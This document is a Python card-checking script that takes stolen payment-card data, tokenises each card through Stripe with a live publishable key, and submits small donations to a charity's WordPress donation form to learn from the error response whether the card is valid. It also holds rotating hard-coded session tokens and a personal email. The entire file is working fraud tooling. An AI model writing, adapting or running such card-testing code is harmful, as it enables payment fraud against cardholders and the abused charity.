import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''zkbzmssh%7C1722163826%7CPYyJVGful9oiz9Fk2qffCmmrLkPFHj6pjCToHoyt8r1%7Ceb9935d8bc113a5acd9c193064033918787622ca95782d6317955699be2082b0
'hdjshshsh%7C1722164162%7CTP3afdym0X81iDDxRTbRkBWLDdAKgqEKwqx6GYim365%7C424cfcf6eb45d32f11893eb98004603b447a77cee129c990e95867665537d75d
bsbsjdhhdj%7C1722164292%7CAnd5Gmo2UVNQz7IFiuuOHbcWFUoVJBk7DQtsjQS27Oa%7C6e9883df5374751c0cdc9383a751fcb80b31dfacc9e4747bbf08883e4986a7c7
jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd95263262ae98ada998ab6063eb46e075d944fda37cffee93b343a
'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	import requests

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests

	cookies = {
			'__stripe_mid': 'd995f54d-9538-4878-a87b-12c43a6bbf36ea2fbc',
			'__stripe_sid': '72b76125-964d-40a9-9c86-1b5fa32027eb550fb6',
	}

	headers = {
			'authority': 'golf316.org',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '_gcl_au=1.1.1367202926.1717785226; _ga=GA1.1.893384611.1717785226; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=3a0199b6-5c49-4a71-902d-5f067e943a8e8b6c91; lp_session_guest=g-6667f5cca6926; twk_idm_key=xdzosJCoUNJs2yO4wkzym; __stripe_sid=7640bd74-93e1-4970-9509-07359c7280685d8ce8; TawkConnectionTime=0; _ga_1MRCZYKWF0=GS1.1.1718151395.11.1.1718151493.0.0.0; _ga_05M43KE6K7=GS1.1.1718151396.27.1.1718151493.0.0.0',
			'origin': 'https://golf316.org',
			'referer': 'https://golf316.org/donations/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728016959531',
	}

	data = {
			'data': '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=3309ed33dc&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=Sai&names%5Blast_name%5D=Myat&email=saimyataungcr8%40gmail.com&payment_input=Other&custom-payment-amount=3&payment_method=stripe&__entry_intermediate_hash=ceb9d66af62f3c39b9f0b3c405664044&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '7',
	}
	
	r2 = requests.post(
			'https://golf316.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json()['errors'])
def sq(card):
    return 'Close Soon Come Back'
